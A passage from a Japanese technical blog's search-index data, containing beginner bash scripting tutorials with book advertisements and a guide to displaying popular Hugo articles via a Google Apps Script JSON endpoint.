読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-18-suzuki/","title":"【１８．関数を作成する】ざっくりわかる「シェルスクリプト」"},{"content":"関数パラメーターを使用する パラメータを使用して関数を作成します。\nBashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。\u0026lsquo;function_parameter.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 \u0026lsquo;Rectangle_Area\u0026rsquo;は、パラメーター値に基づいて長方形の面積を計算します。\n#!/bin/bash Rectangle_Area(){ area=$(($1*$2)); echo \u0026#34;面積は : $area\u0026#34;; } Rectangle_Area 10 20; bashコマンドでファイルを実行します。\nbash-5.1$ bash tmp 面積は : 200 bash-5.1$ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-19-suzuki/","title":"【１９．関数パラメーターを使用する】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\nor 条件を if文で使う orロジックでifステートメントを使用する：\n\u0026lsquo;||\u0026lsquo;は、ifステートメントでorロジックを定義するために使用されます。次のコードを使用して「if_with_or.sh」という名前のファイルを作成し、ifステートメントのorロジックの使用を確認します。ここで、nの値はユーザーから取得されます。値が15または45の場合、出力は「ゲームに勝ちました」になります。それ以外の場合、出力は「ゲームに負けました」になります。\n#!/bin/bash echo \u0026#34;数値を入力して下さい。\u0026#34;; read n; if [[ (\u0026#34;$n\u0026#34; -eq 15 || \u0026#34;$n\u0026#34; -eq 45) ]];then echo \u0026#34;ゲームに勝ちました\u0026#34;; else echo \u0026#34;ゲームに負けました\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_or.sh 数値を入力して下さい。 5 ゲームに負けました $ bash if_with_or.sh 数値を入力して下さい。 45 ゲームに勝ちました bash-5.1$ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 else if と else else ifステートメントの使用：\nelse if条件の使用は、bashでは「elif」を定義します。\u0026rsquo;elseif_example.sh\u0026rsquo;という名前のファイルを作成し、次のスクリプトを追加して、bashスクリプトでelseifがどのように定義されているかを確認します。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; if [ \u0026#34;$n\u0026#34; -eq 101 ];then echo \u0026#34;あなたは一等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 510 ];then echo \u0026#34;あなたは二等賞を獲得しました\u0026#34;; elif [ \u0026#34;$n\u0026#34; -eq 999 ];then echo \u0026#34;あなたは三等賞を獲得しました\u0026#34;; else echo \u0026#34;すみません、またチャレンジして下さい\u0026#34;; fi bashコマンドでファイルを実行します。\nbash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash elseif_example.sh あなたのラッキーナンバーを入力して下さい。 100 すみません、またチャレンジして下さい bash$ bash elseif_example.sh $ 比較演算子使用例意味 -n-n 文字列\t文字列の長さが0より大きければ真 -z-z 文字列\t文字列の長さが0であれば真 =文字列A = 文字列B\t文字列Aと文字列Bが等しければ真 !=文字列A != 文字列B\t文字列Aと文字列Bが等しくなければ真 ヒント シェルスクリプトの比較式には「比較演算子」の左右に空白（半角スペース）が必要です（代入とは別）。 また、比較する変数を「ダブルクォーテーション」で囲まないと、変数が空のときに構文エラーとなってしましますので注意してください。 case 文 caseステートメントの使用：\ncaseステートメントは、if-elseif-elseステートメントの代わりに使用されます。このステートメントの開始ブロックと終了ブロックは、「case」と「esac」によって定義されます。\u0026lsquo;case_example.sh\u0026rsquo;という名前の新しいファイルを作成し、次のスクリプトを追加します。次のスクリプトの出力は、例として前のelseと同じになります。\n#!/bin/bash echo \u0026#34;あなたのラッキーナンバーを入力して下さい。\u0026#34;; read n; case \u0026#34;$n\u0026#34; in 101) echo \u0026#34;あなたは一等賞を獲得しました\u0026#34; ;; 510) echo \u0026#34;あなたは二等賞を獲得しました\u0026#34; ;; 999) echo \u0026#34;あなたは三等賞を獲得しました\u0026#34; ;; *) echo \u0026#34;すみません、またチャレンジして下さい\u0026#34; esac bashコマンドでファイルを実行します。\nbash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 101 あなたは一等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 510 あなたは二等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 999 あなたは三等賞を獲得しました bash$ bash case_example.sh あなたのラッキーナンバーを入力して下さい。 777 すみません、またチャレンジして下さい ヒント case文の終わりには esac を指定します。 コマンドラインから引数を取得 コマンドラインから引数を取得：\nBashスクリプトは、他のプログラミング言語と同様に、コマンドライン引数から入力を読み取ることができます。たとえば、$1と$2の変数は、最初と2番目のコマンドライン引数を読み取るために使用されます。「command_line.sh」という名前のファイルを作成し、次のスクリプトを追加します。次のスクリプトによって読み取られた2つの引数値は、引数の総数と引数値を出力として出力します。\n#!/bin/bash echo \u0026#34;引数の数 : $#\u0026#34;; echo \u0026#34;一つ目の引数 = $1\u0026#34;; echo \u0026#34;二つ目の引数 = $2\u0026#34;; bashコマンドでファイルを実行します。\n$ bash command_line.sh apple windows 引数の数 : 2 一つ目の引数 = apple 二つ目の引数 = windows $ ヒント echo の引数として変数を渡すときは、\u0026quot;$1\u0026quot; のようにダブルクォートで囲む癖をつけます。 $1 のようにダブルクォートで囲まずに変数をそのまま記述してしまうと、値として連続するスペースが含まれていたときに1つのスペースにまとめられてしまいます。また、値が入っていない場合に、正しく処理ができなくなります。 シェルスクリプトの変数はほとんどの場合は \u0026ldquo;$value\u0026rdquo; と囲みます。 名前を使用してコマンドラインから引数を取得する コマンドラインから名前付きの引数を取得：\n名前付きのコマンドライン引数を読み取る方法を示します。\u0026lsquo;command_line_names.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、XとYの2つの引数がこのスクリプトによって読み取られ、XとYの合計が出力されます。\n#!/bin/bash for arg in \u0026#34;$@\u0026#34;;do index=$(echo $arg | cut -f1 -d=); val=$(echo $arg | cut -f2 -d=); case $index in X) x=$val;; Y) y=$val;; *) esac done ((result=x+y)); echo \u0026#34;X+Y=$result\u0026#34;; bashコマンドで二つのコマンドライン引数を使用して、ファイルを実行します。\n$ bash command_line_names.sh X=45 Y=30 X+Y=75 $ ヒント case文で入力された文字列の大文字と小文字に対応する。 または文字列に対応する場合は以下のソースを見て欲しい。 レベルアップしたソースコードはささいな気遣いから生まれる #! /bin/bash case \u0026#34;$1\u0026#34; in [Yy]|\u0026#34;yes\u0026#34;)\t#Y、yまたはyesという文字列 echo \u0026#34;YES\u0026#34; echo \u0026#34;OK\u0026#34; ;; [Nn]|\u0026#34;no\u0026#34;)\t#N、nまたはnoという文字列 echo \u0026#34;NO\u0026#34; ;; *) echo \u0026#34;undefined\u0026#34;;; esac 変数に2つの文字列を組み合わせる 文字列変数を組み合わせる：\n文字列変数はbashで簡単に組み合わせることができます。「string_combine.sh」という名前のファイルを作成し、次のスクリプトを追加して、変数を一緒に配置するか、「+」演算子を使用して、bashで文字列変数を組み合わせる方法を確認します。\n#!/bin/bash string1=\u0026#34;Apple\u0026#34;; string2=\u0026#34;Mac OS\u0026#34;; echo \u0026#34;$string1 $string2\u0026#34;; string3=\u0026#34;$string1 $string2\u0026#34;; string3+=\u0026#34; は、とても優れたＯＳです。\u0026#34; ; echo $string3; bashコマンドでファイルを実行します。\n$ bash string_combine.sh Apple Mac OS Apple Mac OS は、とても優れたＯＳです。 $ ヒント Bash は += 演算子を用いて文字列を連結することもできます。単純に a+=b とすると、a=a+b と理解することができます。 変数と文字列の結合は変数を{} でくくります。以下のソースを見て下さい。\n#!/bin/sh str1 = \u0026#34;Shell script\u0026#34; str = \u0026#34;${str1} is intersting!!\u0026#34; echo $str $ bash string_example2.sh $ Shell script is interesting!! $ 文字列の部分文字列を取得する 文字列の部分文字列を取得します。\n他のプログラミング言語と同様に、bashには文字列データから値を切り取る組み込み関数はありません。ただし、次のスクリプトに示すbashで、別の方法で部分文字列のタスクを実行できます。スクリプトをテストするには、次のコードを使用して「substring_example.sh」という名前のファイルを作成します。ここで、値6は部分文字列が開始する開始点を示し、5は部分文字列の長さを示します。\n#!/bin/bash Str=\u0026#34;Learn Bash from NLP\u0026#34;; subStr=${Str:6:4}; echo \u0026#34;$subStr\u0026#34;; bashコマンドでファイルを実行します。\n$ bash substring_example.sh Bash $ ヒント 基本パターンは以下の通り ${パラメータ:オフセット:長さ}\n: Bashでの文字列の切り出しはかなりの頻度で使います。 知っているのと知らないのとでは、苦労が違ってきます。 具体例を以下にしめします。 #!/bin/bash HOGE=\u0026#34;abcdef\u0026#34; # オフセット位置から長さ分を取得 echo ${HOGE:0:2} # -\u0026gt; ab echo ${HOGE:2:2} # -\u0026gt; cd echo ${HOGE:4:2} # -\u0026gt; ef # 長さを省略した場合はオフセットから最後まで出力 echo ${HOGE:2} # -\u0026gt; cdef # 長さにマイナスを指定した場合は最後からマイナス分引いた位置までの長さになる echo ${HOGE:0:-2} # -\u0026gt; abcd # オフセットの位置にマイナスを指定した場合は文法として別のパラメータ展開になる(デフォルト値の指定) # 指定した変数が空文字列の場合は右に指定した文字が入る echo ${HOGE:-2} # -\u0026gt; abcdef HOGE= echo ${HOGE:-2} # -\u0026gt; 2 #!/bin/bash HOGE=hoge.tar.bz2 echo ${HOGE} # -\u0026gt; hoge.tar.bz2 # 最短除外 echo ${HOGE%.*} # -\u0026gt; hoge.tar # 最長除外 echo ${HOGE%%.*} # -\u0026gt; hoge #!/bin/bash HOGE=/home/user/hoge echo ${HOGE} # -\u0026gt; /home/user/hoge # 最短除外 echo ${HOGE#*/} # -\u0026gt; home/user/hoge # 最長除外 echo ${HOGE##*/} # -\u0026gt; hoge 変数に2つの数値を追加します 2つの数字を追加します。\nさまざまな方法でbashの算術演算を実行できます。次のスクリプトに、二重角かっこを使用してbashに2つの整数を追加する方法を示します。次のコードを使用して、「add_numbers.sh」という名前のファイルを作成します。2つの整数値がユーザーから取得され、加算の結果が出力されます。\n#!/bin/bash echo \u0026#34;最初の数値を入力\u0026#34;; read x; echo \u0026#34;2番目の数値を入力\u0026#34;; read y; ((sum=x+y)); echo \u0026#34;加算の結果=$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash add_numbers.sh 最初の数値を入力 25 2番目の数値を入力 56 加算の結果=81 $ ヒント ((sum=x+y)); 昔の書籍でシェルスクリプトを勉強している人は、驚くかもしれない。だが、今の時代、Bashでは上記のように書く。昔は $ echo `expr 1 + 1`\nこんな書き方をした。現在のBashでは算術演算子が使える。\n以下ににまとめてみた。2重括弧でくくればいい。2重括弧の中に変数を使うことも可能だ。さらに変数は見にくい「$」をつける必要すらない。 $ echo `expr 1+1` # 昔のやり方 $ echo $((5+5)) # 今のやり方 $ echo $((5-5)) $ echo $((5*5)) $ echo $((5/5)) $ echo $((5%5)) # なんと比較演算子もいける！ $ echo $((0==1)) # 等号、結果: 0 $ echo $((0!=1)) # 否定等号、結果: 1 $ echo $((0\u0026lt;1)) # 未満、結果: 1 $ echo $((0\u0026lt;=1)) # 以下、結果: 1 $ echo $((0\u0026gt;1)) # 大なり、結果: 0 $ echo $((0\u0026gt;=1)) # 以上、結果: 0 関数を作成する 関数の作成：\n簡単な関数を作成して関数を呼び出す方法を次のスクリプトに示します。\u0026lsquo;function_example.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。bashスクリプトで角かっこを使用せずに、名前でのみ関数を呼び出すことができます。\n#!/bin/bash function 関数の名前(){ 処理 } このとき、functionは省略可能です。\n#!/bin/bash 関数の名前(){ 処理 } 関数の呼び出しは、関数を定義した後に関数の名前を書くだけです。\n関数の名前 引数 #!/bin/bash # 関数の定義 function say_hello(){ echo \u0026#34;Hello, world!\u0026#34;; } # # 関数の呼び出し say_hello; ヒント このとき、関数の名前に続けて、引数を書くことができます。関数内では、通常のシェルスクリプトの引数を処理するのと同じように$1、$2、\u0026hellip;という形でアクセスできます。 関数パラメーターを使用する パラメータを使用して関数を作成します。\nBashは、関数宣言時に関数パラメーターまたは引数を宣言できません。ただし、他の変数を使用して、関数内でパラメーターを使用できます。関数の呼び出し時に2つの値が渡された場合、値の読み取りには$1と$2の変数が使用されます。\u0026lsquo;function_parameter.sh\u0026rsquo;という名前のファイルを作成し、次のコードを追加します。ここで、関数 \u0026lsquo;Rectangle_Area\u0026rsquo;は、パラメーター値に基づいて長方形の面積を計算します。\n#!/bin/bash Rectangle_Area(){ area=$(($1*$2)); echo \u0026#34;面積は : $area\u0026#34;; } Rectangle_Area 10 20; bashコマンドでファイルを実行します。\nbash-5.1$ bash tmp 面積は : 200 bash-5.1$ 戻り値について bashシェルスクリプトには「戻り値」というものは基本的に存在しない。 解決策として関数やコマンドの「実行結果を直接変数に代入する」という手段をとることになる。\n「return」コマンドは存在するが、あくまで終了ステータスを返しているだけで、関数の戻り値を返す機能ではないので注意しよう。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-12T12:30:57+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-12-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト２"},{"content":"簡単にできるHugoで人気の記事を表示する方法の2回目になります。\n前回（簡単にできるHugoで人気の記事を表示する方法 #01）ではGAS（Google App Scripts）を使ってアナリティクスのデータをスプレッドシートに反映するところまで説明しました。\n今回は前回作成したスプレッドシートからデータを取得して、Hugoと連携するところまでやっていきましょう。\nスプレッドシートのデータをJSONで取得 Hugoやjsなどとの連携を簡単にするために、スプレッドシートのデータをjsonで取得できるようにします。\n前回作成したプログラムを開きます。\n開き方は前回の「簡単にできるHugoで人気の記事を表示する方法 #01」にある「スプレッドシートの設定」を確認してください。\nスプレッドシートのデータをjsonで取得するためには、APIを使用するケースもありますが、今回はAPIを使用しないで取得します。\nプログラムの内容は下記になります。\nスプレッドシートのIDはスプレッドシートのURL部分の\ndocs.google.com/spreadsheets/d/ スプレッドシートのID /edit#gid=0\nといったように docs.google.com/spreadsheets/d/ と edit に囲まれた部分になります。\nfunction getData(sheetName) { const sheet = SpreadsheetApp.openById(\u0026#34;スプレッドシートのID\u0026#34;).getSheetByName(sheetName); const rows = sheet.getDataRange().getValues(); const keys = rows.splice(0, 1)[0]; return rows.map(row =\u0026gt; { let obj = {}; row.map((item, index) =\u0026gt; obj[keys[index]] = item); return obj; }); } function doGet(e) { let data = getData(e.parameter.sheetname); return ContentService.createTextOutput(JSON.stringify(data, null, 2)).setMimeType(ContentService.MimeType.JSON); } プログラムの説明 doGetってなに？ doGet(e) はこのプログラムをURLから実行できるようにした際にパラメータの値を取得して処理を行う関数です。\nここでは getData()という関数に、クエリパラメータsheetnameを渡しております。\nURLにすると、https://〜/exec?sheetname=パラメータ\nとなります。\nこのパラメータ部分にスプレッドシートのシート名を渡すことで、該当するスプレッドシートのデータを表示できるようになるというわけです。\ngetDataでやってること getData(sheetName) では先程のクエリパラメータsheetnameの値を使って、シートから情報を取得してjsonに格納している部分です。\n指定したシートIDの値がある範囲からから値を取得するのが下記のプログラムです。\nconst rows = sheet.getDataRange().getValues(); その取得した値からタイトル、jsonのキーとなる部分を keys として格納します。\nそしたら先程取得した rows の値をループで取得しながらjson形式のデータに加工します。\nすると、\n[ [リンク, pv数, session数, users数], [リンク, pv数, session数, users数] ] というデータが\n[ {link: リンク, pv: pv数, session: session数, users: users数}, {link: リンク, pv: pv数, session: session数, users: users数} ] というjson形式に加工することができました。\nここまでを保存しておきます。\nこのプログラムを公開してURLでアクセスできるようにしましょう。\nGASのプログラムをデプロイして公開 それではここまでのファイルをデプロイして、Webでアクセスできるようにしましょう。\n右上にある「デプロイ」を押して、新しいデプロイをクリックします。\nすると、「新しいデプロイ」となるので、歯車のマーク「デプロイを有効にする」をおして、「ウェブアプリ」を選択します。\n設定の画面になるので、説明などを入力します。\n「次のユーザーとして実行」は自身のアドレスでかまいません。\n「アクセスできるよユーザー」部分は「 全員 」とします。\nこれによって、Hugoから呼び出した際に実行できるようになります。\nここまで設定できたら「デプロイ」を押して、プログラムを公開します。\n表示されたウェブアプリのURLが表示されるので、コピーしておきます。\n先程コピーしたURLの末尾に?sheetname=monthを追加してアクセスしてみましょう。\nhttps://script.google.com/macros/s/〜/exec?sheetname=month\nURLはこのような形になります。\n正常にアクセスできていれば\nとjson形式のデータが表示されるはずです。\nエラーが出た場合 TypeError: Cannot read property \u0026#39;getDataRange\u0026#39; of null（行 3、ファイル「コード」） というエラーが出た場合はパラメータが記述されていないだけなので、パラメータを記述することで正常に取得できます。\nそれ以外の場合は、「デバッグ」を使ってエラーを特定していく必要があります。\nデバッグではdoGetはクエリ取得できないので、e.parameter.sheetname部分を\u0026quot;month\u0026quot;と直書きしてデバッグを実行します。\nデプロイには注意 デプロイで「新しいデプロイ」を選択するとURLが変わる点に注意です。\nGASでウェブアプリのURLを固定するための方法は、「デプロイを管理」から更新をするようにします。\n「デプロイ」の「デプロイを管理」を押します。 そして、右にある鉛筆マークの「編集」を押します。\nすると、編集画面になり、バージョンや説明を修正することができます。 バージョン部分を「新しいバージョン」として、説明に「最新版」とでも打っておきましょう。 この状態で「デプロイ」をクリックします。 上記の作業で、URLを固定したままウェブアプリを公開することができます。\nHugoと連携して人気の記事を表示する アナリティクスとスプレッドシートを使って人気の記事をjsonで取得する事ができるようになったので、Hugoと連携します。\nHugoにはjsonを取得する機能がついているので、その機能を使ってデータを取得します。\n{{ $json := getJSON \u0026#34;https://script.google.com/macros/s/〜/exec?sheetname=month\u0026#34; }} \u0026lt;aside class=\u0026#34;widget archives sidearticle-contents--wrapper\u0026#34; id=\u0026#34;popular-articles--month\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;contents-area\u0026#34;\u0026gt; \u0026lt;header\u0026gt;\u0026lt;h2 class=\u0026#34;section-title\u0026#34;\u0026gt;人気の記事（1ヶ月以内）\u0026lt;/h2\u0026gt;\u0026lt;/header\u0026gt; \u0026lt;div class=\u0026#34;sidearticle-contents\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;flex article-list--tile\u0026#34;\u0026gt; {{ $page := .Site.Pages }} {{ range first .Site.Params.widgets.populerArticles.limit $json }} {{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} {{ if $article }} \u0026lt;article\u0026gt; \u0026lt;h3 class=\u0026#34;article-title\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ $article.RelPermalink }}\u0026#34;\u0026gt;{{- $article.Title -}}\u0026lt;/a\u0026gt;\u0026lt;/h3\u0026gt; \u0026lt;/article\u0026gt; {{ end }} {{ end }} \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/aside\u0026gt; getJSON のURLは先ほど作成したGASのウェブアプリURLになります。\n今回は月間の人気記事を取得したいので、?sheetname=monthとしてあります。\n年の場合はyear日の場合はdayなどとすることで必要な情報を取得できます。\n使用しているテンプレートにも夜と思いますが、layouts/partials/widget/popularArticlesMonth.html として保存しておきましょう。\nこのファイルをHugoで読み込むことで人気の記事を表示する事ができるようになります。\n取得する人気の記事件数はconfig.yamlなどのhugoの設定ファイル内のwidhetsにpopulerArticlesを追加して記述しておきます。\nwidgets: enabled: - popular-articles populerArticles: limit: 10 人気の記事を表示するプログラムの解説 まずはサイト全体の記事を取得しておきます。\n{{ $page := .Site.Pages }} 次に、取得したjsonのデータを設定で指定した範囲で取得します。\n{{ range first .Site.Params.widgets.populerArticles.limit $json }} ... {{ end }} 取得したデータからリンクに一致する記事を探します。\n配列のデータで検索されているので、indexを使って0番目の記事を取得しています。\nあとは通常の記事と同じように扱えます。\n{{ $article := index (where $page \u0026#34;.RelPermalink\u0026#34; \u0026#34;eq\u0026#34; .link ) 0 }} 今回は画像無しでタイトルのみの表示となりますが、データ自体は他の記事と同じなので画像やカテゴリ、本文などにもアクセス可能です。\n自動更新の設定 サイトに人気の記事を表示させることができました。\n今の設定だと人気の記事が更新されないので、GASの「トリガー」を使って定期的にアナリティクスのデータをjsonに反映するようにしておきます。\nfunction setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } function all() { setDay(); setMonth(); setYear(); } 月だけでなく、日、年のデータも取得する夜にしておきます。\nそして、それらをすべて実行する関数「all」も追加しておきましょう。ここで保存しておきます。\nこれで準備ができました。\n左袖にあるストップウォッチアイコンを押して、「トリガー」を追加します。\n「トリガーを追加」を押して、「実行する関数」で実行したい関数を選びます。今回は月間のデータを取得したいので「setMonth」を選択します。 「実行するデプロイを選択」は「Head」のままで構いません。 「イベントのソースを選択」は「時間主導型」に変更して、時間で実行するようにしておきます。 「時間ベースのトリガーのタイプを選択」を更新したい頻度で選択します。月間のデータなので1日おきくらいに更新でもいいかもしれません。「日付ベースのタイマー」を選択します。\n一日おきではなく、毎時で更新したい場合は「時間ベースのタイマー」など各自にあったタイマーを選択してください。 「時刻を選択」で更新したい時間を選びます。とりあえず「午前4時〜5時」くらいに更新するようにしておきます。 「エラー通知設定」は各自で好きなタイミングで受信するようにしてください。私はいっぱい来ると嫌なので、「1週間おきに通知を受け取る」にしてあります。\n以上で設定が終わりました。下にある「保存」を押して保存します。\nこれで定期的にアナリティクスのデータがスプレッドシートに反映されるようになりました。\nまとめ Hugoで人気の記事を表示するには\nGoogleアナリティクスの連携 スプレッドシートを使ってjsonを作成 上記の2つを使うことで簡単に導入可能です。\nHugoを使って人気の記事を作成するにはサイトや投稿を公開した際になりますが、GitHub Actionsなどを使えばcron処理で定期的に再構築をかけることが可能なので、数十分おきに人気の記事を更新したり、スプレッドシートとgasのレン系の際にjsonを作成したので、javascriptでjsonを読み取って表示するといったことも可能です。\nソース 前回と今回で作成したソースになります。\nGASとスプレッドシートを使ってHugoに人気の記事を表示する function getData(sheetName) { const sheet = SpreadsheetApp.openById(\u0026#34;シートID\u0026#34;).getSheetByName(sheetName); const rows = sheet.getDataRange().getValues(); const keys = rows.splice(0, 